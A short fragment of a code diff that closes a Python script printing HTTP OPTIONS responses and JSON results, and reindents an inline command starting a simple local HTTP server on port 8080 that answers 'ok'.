+    print(f"  OPTIONS {path}: {code} {r.get('body','')[:100]}")
+
+print("\n[RESULTS_START]")
+print(json.dumps(results, indent=2, default=str))
+print("[RESULTS_END]")
+PYEOF
             python3 -c "
-            import http.server
-            class H(http.server.BaseHTTPRequestHandler):
-                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
-                def log_message(self, *a): pass
-            http.server.HTTPServer(('', 8080), H).serve_forever()
-            "
+import http.server
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+    def log_message(self, *a): pass
+http.server.HTTPServer(('', 8080), H).serve_forever()
+"
